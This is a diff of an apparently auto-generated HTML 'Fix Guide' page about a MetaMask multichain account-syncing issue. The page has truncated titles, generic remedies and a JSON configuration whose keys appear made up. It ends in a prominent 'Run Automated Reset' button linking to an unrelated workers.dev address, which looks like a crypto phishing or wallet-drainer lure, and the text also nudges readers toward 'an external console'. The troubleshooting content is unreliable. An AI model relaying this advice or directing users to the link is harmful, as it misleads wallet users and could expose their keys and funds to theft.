@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Metamask Extension P0 Investigate And Cap Multichain Account Creation/Syncing Span Fan-Out – Fix Guide</title>
+<head><meta charset="UTF-8"><title>Metamask Extension P0 Investigate And Cap Multichain Account Cr – Fix Guide</title>
 <style>
     body {
-        font-family: -apple-system;
-        background: #1a1a24;
+        font-family: system-ui;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #cf6679; }
     .btn {
-        background: #ff9455;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -39,42 +39,37 @@
 </head>
 <body>
 <div class="content">
-<h1>Metamask Extension P0 Investigate And Cap Multichain Account Creation/Syncing Span Fan-Out</h1>
+<h1>Metamask Extension P0 Investigate And Cap Multichain Account Cr</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience errors when creating or syncing multichain accounts in Metamask, resulting in excessive span fan-out and potential crashes.</li>
+<li>Users experience issues with Metamask extension when creating or syncing multichain accounts, resulting in a fan-out error, indicated by a "P0" priority warning.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The issue arises from the extension's inability to efficiently handle the creation and syncing of multiple chain accounts, leading to a surge in concurrent requests and subsequent timeouts.</li>
+<li>The error occurs due to excessive account creation and syncing requests, overwhelming the system and causing a span fan-out, which Metamask flags as a high-priority warning.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To mitigate this issue, users can attempt the following manual overrides:</li>
-<li>Reduce the number of chain accounts being synced simultaneously</li>
-<li>Increase the timeout threshold for account creation and syncing requests</li>
-<li>Utilize a custom configuration to limit the span fan-out, as shown in the example below:</li>
+<li>To mitigate this issue, users can try the following:</li>
+<li>Limit the number of accounts being created or synced simultaneously</li>
+<li>Implement a rate limiter to control the frequency of requests</li>
+<li>Utilize the following JSON configuration to cap account creation:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;multichain&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;accountCreation&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">      </span><span class="nt">&quot;maxConcurrentRequests&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span>
-<span class="w">    </span><span class="p">},</span>
-<span class="w">    </span><span class="nt">&quot;accountSyncing&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">      </span><span class="nt">&quot;timeout&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">30000</span>
-<span class="w">    </span><span class="p">}</span>
-<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="nt">&quot;accountCreationLimit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;syncingLimit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;rateLimit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider using an external console to fine-tune these settings for optimal performance.</p>
+<p>Consider utilizing an external console to further diagnose and resolve the issue.</p>
 <h2>Prerequisites</h2>
 <ul>
 <li>Metamask extension installed and configured</li>
 <li>Ethereum network connection established</li>
 <li>Basic understanding of JSON configuration files</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/go-ethereum-error-in-block-freeze-operation-errcanonical-hash-m.html">Go Ethereum Error In Block Freeze Operation Errcanonical Hash M</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-confirming-the-add-token-from-a-d.html">Metamask Extension Bug Assets Confirming The Add Token From A D</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/go-ethereum-error-in-block-freeze-operation-errcanonical-hash-m.html">Go Ethereum Error In Block Freeze Operation Errcanonical Hash M</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-confirming-the-add-token-from-a-d.html">Metamask Extension Bug Assets Confirming The Add Token From A D</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
